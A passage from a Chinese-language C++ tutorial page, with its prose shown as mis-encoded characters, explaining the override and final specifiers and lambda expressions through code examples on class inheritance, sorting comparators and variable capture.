class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Document</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing a generic document.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* filename)</span> </span>&#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Saving generic document to &quot;</span> &lt;&lt; filename &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~Document() = <span class="keyword">default</span>; <span class="comment">// è™šææ„å‡½æ•°å¾ˆé‡è¦</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Report ç»§æ‰¿è‡ª Document</span></span><br><span class="line"><span class="comment">// Report æœ¬èº«ä¹Ÿç¦æ­¢è¢«è¿›ä¸€æ­¥ç»§æ‰¿ (final class)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Report</span> <span class="keyword">final</span> :</span> <span class="keyword">public</span> Document &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ override ç¡®ä¿æ­£ç¡®è¦†ç›–</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="comment">// OKï¼Œè¦†ç›–äº†åŸºç±»çš„ print</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing a specific report.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// void save(char* filename) override; // ç¼–è¯‘é”™è¯¯ï¼å‚æ•°ç±»å‹ const char* vs char* ä¸åŒ¹é…</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ final é˜»æ­¢åç»­æ´¾ç”Ÿç±»è¦†ç›– save</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* filename)</span> <span class="keyword">override</span> <span class="keyword">final</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Saving report securely to &quot;</span> &lt;&lt; filename &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// void nonVirtualMethod() override; // ç¼–è¯‘é”™è¯¯ï¼åŸºç±»æ²¡æœ‰è¿™ä¸ªè™šå‡½æ•°</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// ç¼–è¯‘é”™è¯¯ï¼Report è¢«æ ‡è®°ä¸º finalï¼Œä¸èƒ½è¢«ç»§æ‰¿</span></span><br><span class="line"><span class="comment">class SpecialReport : public Report &#123;</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    // ç¼–è¯‘é”™è¯¯ï¼save åœ¨ Report ä¸­è¢«æ ‡è®°ä¸º final</span></span><br><span class="line"><span class="comment">    // void save(const char* filename) override &#123;</span></span><br><span class="line"><span class="comment">    //     std::cout &lt;&lt; &quot;Trying to save special report...\n&quot;;</span></span><br><span class="line"><span class="comment">    // &#125;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Document* doc1 = <span class="keyword">new</span> Document();</span><br><span class="line">    Document* doc2 = <span class="keyword">new</span> Report();</span><br><span class="line"></span><br><span class="line">    doc1-&gt;print(); <span class="comment">// Output: Printing a generic document.</span></span><br><span class="line">    doc2-&gt;print(); <span class="comment">// Output: Printing a specific report. (å¤šæ€)</span></span><br><span class="line"></span><br><span class="line">    doc1-&gt;save(<span class="string">&quot;doc.txt&quot;</span>);</span><br><span class="line">    doc2-&gt;save(<span class="string">&quot;report.txt&quot;</span>); <span class="comment">// è°ƒç”¨ Report::save</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> doc1;</span><br><span class="line">    <span class="keyword">delete</span> doc2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>override</code> å’Œ <code>final</code> æé«˜äº†ä»£ç çš„å¥å£®æ€§å’Œå¯ç»´æŠ¤æ€§ï¼Œä½¿å¾—åœ¨å¤æ‚çš„ç»§æ‰¿ä½“ç³»ä¸­æ›´å®¹æ˜“æ­£ç¡®åœ°ç®¡ç†è™šå‡½æ•°ï¼Œå¹¶æ˜ç¡®è®¾è®¡æ„å›¾ã€‚</p><h2 id="18-4-Lambda-å‡½æ•°"><a href="#18-4-Lambda-å‡½æ•°" class="headerlink" title="18.4 Lambda å‡½æ•°"></a>18.4 Lambda å‡½æ•°</h2><p>C++11 å¼•å…¥äº†ä¸€ä¸ªéå¸¸å¼ºå¤§çš„ç‰¹æ€§ï¼š<strong>Lambda è¡¨è¾¾å¼ (Lambda Expression)**ï¼Œé€šå¸¸ç®€ç§°ä¸º **Lambda å‡½æ•°</strong> æˆ– <strong>Lambda</strong>ã€‚Lambda è¡¨è¾¾å¼å…è®¸æˆ‘ä»¬åœ¨éœ€è¦å¯è°ƒç”¨å¯¹è±¡ï¼ˆå¦‚å‡½æ•°æŒ‡é’ˆã€å‡½æ•°å¯¹è±¡ï¼‰çš„åœ°æ–¹<strong>å°±åœ°å®šä¹‰ä¸€ä¸ªåŒ¿åçš„å‡½æ•°å¯¹è±¡</strong>ã€‚</p><p>Lambda çš„ä¸»è¦ç›®çš„æ˜¯æä¾›ä¸€ç§ç®€æ´çš„æ–¹å¼æ¥å®šä¹‰ç®€çŸ­çš„ã€é€šå¸¸åªåœ¨å±€éƒ¨èŒƒå›´å†…ä½¿ç”¨çš„å‡½æ•°æˆ–æ“ä½œï¼Œç‰¹åˆ«æ˜¯åœ¨å°†å®ƒä»¬ä½œä¸ºå‚æ•°ä¼ é€’ç»™ STL ç®—æ³•æ—¶ã€‚</p><h3 id="Lambda-è¡¨è¾¾å¼è¯­æ³•"><a href="#Lambda-è¡¨è¾¾å¼è¯­æ³•" class="headerlink" title="Lambda è¡¨è¾¾å¼è¯­æ³•"></a>Lambda è¡¨è¾¾å¼è¯­æ³•</h3><p>Lambda è¡¨è¾¾å¼çš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[capture_clause](parameters) -&gt; return_type &#123;</span><br><span class="line">    <span class="comment">// function body</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong><code>[capture_clause]</code> (æ•è·å­å¥):</strong> è¿™æ˜¯ Lambda è¡¨è¾¾å¼çš„å¼€å§‹ã€‚æ–¹æ‹¬å· <code>[]</code> ç”¨äºæŒ‡å®šå¦‚ä½•ä»<strong>å®šä¹‰ Lambda çš„å¤–éƒ¨ä½œç”¨åŸŸ</strong>æ•è·å˜é‡ï¼ˆå³è®© Lambda å†…éƒ¨å¯ä»¥è®¿é—®å¤–éƒ¨å˜é‡ï¼‰ã€‚<ul><li>  <code>[]</code>: ä¸æ•è·ä»»ä½•å¤–éƒ¨å˜é‡ã€‚</li><li>  <code>[=]</code>: ä»¥<strong>å€¼æ‹·è´</strong>æ–¹å¼æ•è·æ‰€æœ‰å¤–éƒ¨ä½œç”¨åŸŸä¸­çš„<strong>è‡ªåŠ¨å˜é‡</strong>ï¼ˆå±€éƒ¨å˜é‡å’Œå‚æ•°ï¼‰ã€‚</li><li>  <code>[&amp;]</code>: ä»¥<strong>å¼•ç”¨</strong>æ–¹å¼æ•è·æ‰€æœ‰å¤–éƒ¨ä½œç”¨åŸŸä¸­çš„<strong>è‡ªåŠ¨å˜é‡</strong>ã€‚</li><li>  <code>[var]</code>: ä»¥<strong>å€¼æ‹·è´</strong>æ–¹å¼æ•è·æŒ‡å®šçš„å˜é‡ <code>var</code>ã€‚</li><li>  <code>[&amp;var]</code>: ä»¥<strong>å¼•ç”¨</strong>æ–¹å¼æ•è·æŒ‡å®šçš„å˜é‡ <code>var</code>ã€‚</li><li>  <code>[this]</code>: æ•è·å½“å‰å¯¹è±¡çš„ <code>this</code> æŒ‡é’ˆï¼ˆä»…åœ¨ç±»çš„éé™æ€æˆå‘˜å‡½æ•°å†…éƒ¨æœ‰æ•ˆï¼‰ã€‚</li><li>  å¯ä»¥æ··åˆä½¿ç”¨ï¼Œä¾‹å¦‚ <code>[=, &amp;var1, &amp;var2]</code> (é»˜è®¤å€¼æ•è·ï¼Œä½† <code>var1</code> å’Œ <code>var2</code> å¼•ç”¨æ•è·)ï¼Œ<code>[&amp;, var1, var2]</code> (é»˜è®¤å¼•ç”¨æ•è·ï¼Œä½† <code>var1</code> å’Œ <code>var2</code> å€¼æ•è·)ã€‚</li></ul></li><li>  <strong><code>(parameters)</code> (å‚æ•°åˆ—è¡¨):</strong> å¯é€‰ã€‚ä¸æ™®é€šå‡½æ•°çš„å‚æ•°åˆ—è¡¨ç±»ä¼¼ï¼Œå®šä¹‰ Lambda æ¥å—çš„å‚æ•°ã€‚å¦‚æœ Lambda ä¸éœ€è¦å‚æ•°ï¼Œå¯ä»¥çœç•¥ <code>()</code>ã€‚</li><li>  <strong><code>-&gt; return_type</code> (è¿”å›ç±»å‹):</strong> å¯é€‰ã€‚ç”¨äºæ˜¾å¼æŒ‡å®š Lambda çš„è¿”å›ç±»å‹ã€‚å¦‚æœçœç•¥ï¼Œç¼–è¯‘å™¨ä¼šå°è¯•æ ¹æ®å‡½æ•°ä½“ä¸­çš„ <code>return</code> è¯­å¥è‡ªåŠ¨æ¨æ–­è¿”å›ç±»å‹ï¼ˆå¦‚æœå‡½æ•°ä½“åªæœ‰ä¸€ä¸ª <code>return</code> è¯­å¥ï¼Œæˆ–è€…æ‰€æœ‰ <code>return</code> è¯­å¥è¿”å›ç›¸åŒç±»å‹ï¼Œæˆ–è€…æ²¡æœ‰ <code>return</code> è¯­å¥åˆ™æ¨æ–­ä¸º <code>void</code>ï¼‰ã€‚å¦‚æœæ— æ³•æ¨æ–­æˆ–éœ€è¦ç‰¹å®šç±»å‹ï¼Œåˆ™å¿…é¡»æ˜¾å¼æŒ‡å®šã€‚</li><li>  <strong><code>&#123; function body &#125;</code> (å‡½æ•°ä½“):</strong> åŒ…å« Lambda æ‰§è¡Œçš„ä»£ç ï¼Œä¸æ™®é€šå‡½æ•°çš„å‡½æ•°ä½“ç±»ä¼¼ã€‚</li></ul><p><strong>æœ€ç®€å•çš„ Lambda:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[]()&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello Lambda!\n&quot;</span>; &#125; <span class="comment">// ä¸€ä¸ªä¸æ•è·ã€ä¸æ¥å—å‚æ•°ã€æ— è¿”å›å€¼çš„ Lambda</span></span><br></pre></td></tr></table></figure><p><strong>Lambda çš„ç±»å‹:</strong> æ¯ä¸ª Lambda è¡¨è¾¾å¼éƒ½ä¼šç”Ÿæˆä¸€ä¸ª<strong>å”¯ä¸€çš„ã€æœªå‘½åçš„å‡½æ•°å¯¹è±¡ç±»å‹</strong>ã€‚è¿™æ„å‘³ç€å³ä½¿ä¸¤ä¸ª Lambda è¡¨è¾¾å¼çš„æ–‡æœ¬å®Œå…¨ç›¸åŒï¼Œå®ƒä»¬çš„ç±»å‹ä¹Ÿæ˜¯ä¸åŒçš„ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> lambda1 = []()&#123;&#125;;</span><br><span class="line"><span class="keyword">auto</span> lambda2 = []()&#123;&#125;;</span><br><span class="line"><span class="comment">// decltype(lambda1) != decltype(lambda2)</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å°† Lambda èµ‹å€¼ç»™ <code>auto</code> å˜é‡ï¼Œæˆ–è€…å­˜å‚¨åœ¨ <code>std::function</code> åŒ…è£…å™¨ä¸­ã€‚</p><h3 id="18-4-1-æ¯”è¾ƒå‡½æ•°æŒ‡é’ˆã€å‡½æ•°ç¬¦å’Œ-Lambda-å‡½æ•°"><a href="#18-4-1-æ¯”è¾ƒå‡½æ•°æŒ‡é’ˆã€å‡½æ•°ç¬¦å’Œ-Lambda-å‡½æ•°" class="headerlink" title="18.4.1 æ¯”è¾ƒå‡½æ•°æŒ‡é’ˆã€å‡½æ•°ç¬¦å’Œ Lambda å‡½æ•°"></a>18.4.1 æ¯”è¾ƒå‡½æ•°æŒ‡é’ˆã€å‡½æ•°ç¬¦å’Œ Lambda å‡½æ•°</h3><p>åœ¨éœ€è¦ä¼ é€’å¯è°ƒç”¨å®ä½“çš„åœºæ™¯ï¼ˆå¦‚ STL ç®—æ³•ï¼‰ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‡½æ•°æŒ‡é’ˆã€å‡½æ•°å¯¹è±¡ï¼ˆå‡½æ•°ç¬¦ï¼‰æˆ– Lambda å‡½æ•°ã€‚</p><ul><li><strong>å‡½æ•°æŒ‡é’ˆ:</strong><ul><li>  ä¼˜ç‚¹ï¼šè¯­æ³•ç®€å•ï¼Œå¯¹äºå·²å­˜åœ¨çš„æ™®é€šå‡½æ•°å¾ˆæ–¹ä¾¿ã€‚</li><li>  ç¼ºç‚¹ï¼šä¸èƒ½æºå¸¦çŠ¶æ€ï¼Œé€šå¸¸æ— æ³•å†…è”ï¼Œçµæ´»æ€§å·®ã€‚</li></ul></li><li><strong>å‡½æ•°å¯¹è±¡ (Functor):</strong><ul><li>  ä¼˜ç‚¹ï¼šå¯ä»¥æºå¸¦çŠ¶æ€ï¼ˆé€šè¿‡æˆå‘˜å˜é‡ï¼‰ï¼Œå¯ä»¥å†…è”ï¼Œç±»å‹å®‰å…¨ã€‚</li><li>  ç¼ºç‚¹ï¼šéœ€è¦å•ç‹¬å®šä¹‰ä¸€ä¸ªç±»ï¼Œä»£ç ç›¸å¯¹å†—é•¿ï¼Œç‰¹åˆ«æ˜¯å¯¹äºç®€å•çš„æ“ä½œã€‚</li></ul></li><li><strong>Lambda å‡½æ•°:</strong><ul><li>  ä¼˜ç‚¹ï¼šè¯­æ³•ç®€æ´ï¼Œå¯ä»¥ç›´æ¥åœ¨è°ƒç”¨ç‚¹å®šä¹‰ï¼Œæ˜“äºé˜…è¯»ï¼›å¯ä»¥é€šè¿‡æ•è·å­å¥æ–¹ä¾¿åœ°è®¿é—®ï¼ˆæºå¸¦ï¼‰å¤–éƒ¨çŠ¶æ€ï¼›é€šå¸¸å¯ä»¥å†…è”ï¼›åŠŸèƒ½å¼ºå¤§çµæ´»ã€‚</li><li>  ç¼ºç‚¹ï¼šå¯¹äºå¤æ‚æˆ–éœ€è¦åœ¨å¤šå¤„é‡ç”¨çš„é€»è¾‘ï¼Œå•ç‹¬å®šä¹‰å‡½æ•°æˆ–å‡½æ•°å¯¹è±¡å¯èƒ½æ›´æ¸…æ™°ã€‚</li></ul></li></ul><p><strong>ç¤ºä¾‹å¯¹æ¯” (ç”¨äº <code>std::sort</code> çš„è‡ªå®šä¹‰æ¯”è¾ƒ):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. ä½¿ç”¨å‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">compareDescendingPtr</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a &gt; b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. ä½¿ç”¨å‡½æ•°å¯¹è±¡</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CompareDescendingFunctor</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a &gt; b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v_copy1 = v;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v_copy2 = v;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v_copy3 = v;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨å‡½æ•°æŒ‡é’ˆæ’åº</span></span><br><span class="line">    <span class="built_in">std</span>::sort(v_copy1.begin(), v_copy1.end(), compareDescendingPtr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨å‡½æ•°å¯¹è±¡æ’åº</span></span><br><span class="line">    <span class="built_in">std</span>::sort(v_copy2.begin(), v_copy2.end(), CompareDescendingFunctor());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ Lambda å‡½æ•°æ’åº</span></span><br><span class="line">    <span class="built_in">std</span>::sort(v_copy3.begin(), v_copy3.end(),</span><br><span class="line">              [](<span class="keyword">int</span> a, <span class="keyword">int</span> b) -&gt; <span class="keyword">bool</span> &#123; <span class="keyword">return</span> a &gt; b; &#125; <span class="comment">// -&gt; bool å¯çœç•¥</span></span><br><span class="line">             );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sorted (ptr): &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x : v_copy1) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sorted (functor): &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x : v_copy2) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sorted (lambda): &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x : v_copy3) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒLambda è¡¨è¾¾å¼æä¾›äº†æœ€ç®€æ´çš„è¯­æ³•ï¼Œå°†æ¯”è¾ƒé€»è¾‘ç›´æ¥å†™åœ¨äº† <code>sort</code> è°ƒç”¨å¤„ã€‚</p><h3 id="18-4-2-ä¸ºä½•ä½¿ç”¨-lambda"><a href="#18-4-2-ä¸ºä½•ä½¿ç”¨-lambda" class="headerlink" title="18.4.2 ä¸ºä½•ä½¿ç”¨ lambda"></a>18.4.2 ä¸ºä½•ä½¿ç”¨ lambda</h3><p>Lambda è¡¨è¾¾å¼çš„ä¸»è¦ä¼˜åŠ¿åœ¨äºå…¶<strong>ç®€æ´æ€§</strong>å’Œ<strong>å±€éƒ¨æ€§</strong>ã€‚</p><ol><li><p> <strong>ç®€æ´æ€§:</strong> å¯¹äºåªéœ€è¦ä¸€ä¸¤è¡Œä»£ç çš„ç®€å•æ“ä½œæˆ–è°“è¯ï¼Œå®šä¹‰ä¸€ä¸ªå®Œæ•´çš„å‡½æ•°æˆ–å‡½æ•°å¯¹è±¡ç±»æ˜¾å¾—è¿‡äºç¹çã€‚Lambda å…è®¸ç”¨éå¸¸ç´§å‡‘çš„è¯­æ³•ç›´æ¥è¡¨è¾¾è¿™äº›é€»è¾‘ã€‚</p></li><li><p> <strong>å±€éƒ¨æ€§:</strong> Lambda å¯ä»¥ç›´æ¥å®šä¹‰åœ¨ä½¿ç”¨å®ƒçš„åœ°æ–¹ï¼ˆä¾‹å¦‚ï¼Œä½œä¸ºç®—æ³•çš„å‚æ•°ï¼‰ã€‚è¿™ä½¿å¾—ä»£ç æ›´æ˜“äºé˜…è¯»å’Œç†è§£ï¼Œå› ä¸ºæ“ä½œé€»è¾‘å’Œè°ƒç”¨å®ƒçš„ä»£ç ç´§å¯†åœ°æ”¾åœ¨ä¸€èµ·ï¼Œä¸éœ€è¦è·³è½¬åˆ°å…¶ä»–åœ°æ–¹å»æŸ¥æ‰¾å‡½æ•°æˆ–ç±»çš„å®šä¹‰ã€‚</p></li><li><p> <strong>çŠ¶æ€æ•è·:</strong> Lambda çš„æ•è·æœºåˆ¶æä¾›äº†ä¸€ç§éå¸¸æ–¹ä¾¿çš„æ–¹å¼æ¥è®¿é—®å®šä¹‰ Lambda æ—¶æ‰€å¤„ä½œç”¨åŸŸçš„å±€éƒ¨å˜é‡ï¼Œè€Œæ— éœ€æ‰‹åŠ¨å°†è¿™äº›å˜é‡åŒ…è£…åˆ°å‡½æ•°å¯¹è±¡ä¸­ã€‚</p></li></ol><p><strong>ç¤ºä¾‹ (ä½¿ç”¨æ•è·):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nums = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> threshold = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; results;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ lambda æŸ¥æ‰¾æ‰€æœ‰å¤§äº threshold çš„æ•°ï¼Œå¹¶å¤åˆ¶åˆ° results</span></span><br><span class="line">    <span class="comment">// æ•è· threshold (å€¼æ‹·è´) å’Œ results (å¼•ç”¨)</span></span><br><span class="line">    <span class="built_in">std</span>::for_each(nums.begin(), nums.end(),</span><br><span class="line">                  [threshold, &amp;results](<span class="keyword">int</span> x) &#123;</span><br><span class="line">                      <span class="keyword">if</span> (x &gt; threshold) &#123;</span><br><span class="line">                          results.push_back(x); <span class="comment">// å¯ä»¥ä¿®æ”¹å¼•ç”¨æ•è·çš„ results</span></span><br><span class="line">                          <span class="comment">// threshold = 10; // ç¼–è¯‘é”™è¯¯ï¼å€¼æ•è·çš„å˜é‡é»˜è®¤æ˜¯ const çš„</span></span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Numbers greater than &quot;</span> &lt;&lt; threshold &lt;&lt; <span class="string">&quot;: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> r : results) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; r &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// è¾“å‡º: 6 7 8 9 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¼”ç¤º mutable lambda (å…è®¸ä¿®æ”¹å€¼æ•è·çš„å˜é‡çš„å‰¯æœ¬)</span></span><br><span class="line">    <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">auto</span> mutable_lambda = [counter]() <span class="keyword">mutable</span> &#123; <span class="comment">// ä½¿ç”¨ mutable</span></span><br><span class="line">        counter++; <span class="comment">// ç°åœ¨å¯ä»¥ä¿®æ”¹ counter çš„å‰¯æœ¬äº†</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Lambda counter (copy): &quot;</span> &lt;&lt; counter &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    mutable_lambda(); <span class="comment">// è¾“å‡º 1</span></span><br><span class="line">    